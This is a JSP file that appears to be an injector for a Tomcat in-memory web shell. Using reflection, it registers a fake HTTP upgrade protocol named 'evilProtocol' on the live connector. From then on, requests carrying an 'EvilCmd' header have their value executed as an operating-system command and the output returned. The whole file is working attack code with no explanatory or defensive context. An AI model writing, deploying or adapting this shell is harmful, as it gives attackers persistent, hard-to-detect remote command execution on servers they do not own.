<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.coyote.*" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.coyote.http11.Http11NioProtocol" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.coyote.http11.AbstractHttp11Protocol" %>

<%
    class EvilProtocol implements UpgradeProtocol {

        @Override
        public String getHttpUpgradeName(boolean b) {
            return "";
        }

        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        @Override
        public String getAlpnName() {
            return "";
        }

        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, Request request) {
            return null;
        }

        @Override
        public boolean accept(Request request) {
            // This method is called when there is an Upgrade header in the request
            // that specifies this protocol name.

            String cmd = request.getHeader("EvilCmd");
            if (cmd != null) {
                byte[] result = null;
                try {
                    result = Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes();
                    Field resonseField = Request.class.getDeclaredField("response");
                    resonseField.setAccessible(true);
                    Response response = (Response) resonseField.get(request);
                    response.doWrite(ByteBuffer.wrap(result));
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
            return false; // Reject all upgrades
        }
    }

    if (request.getParameter("inject") != null) {
        try {
            // get Request obj from the current RequestFacade request
            Field requestFacadeField = RequestFacade.class.getDeclaredField("request");
            requestFacadeField.setAccessible(true);
            org.apache.catalina.connector.Request coreRequest = (org.apache.catalina.connector.Request) requestFacadeField.get(request);

            // get the Connector obj from the Request
            Field connectorField = org.apache.catalina.connector.Request.class.getDeclaredField("connector");
            connectorField.setAccessible(true);
            Connector connector = (Connector) connectorField.get(coreRequest);

            // get the Http11NioProtocol obj from the Connector
            Field protocolField = Connector.class.getDeclaredField("protocolHandler");
            protocolField.setAccessible(true);
            Http11NioProtocol protocolHandler = (Http11NioProtocol) protocolField.get(connector);

            // get the httpUpgradeProtocols from the Http11NioProtocol
            Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
            upgradeProtocolsField.setAccessible(true);
            HashMap<String, UpgradeProtocol> upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(protocolHandler);

            // add the EvilProtocol to the httpUpgradeProtocols map
            upgradeProtocols.put("evilProtocol", new EvilProtocol());
            response.getWriter().println("Shell injected successfully!");
        } catch (Exception e) {
            response.getWriter().println("Error injecting shell: " + e.getMessage());
        }
    }
%>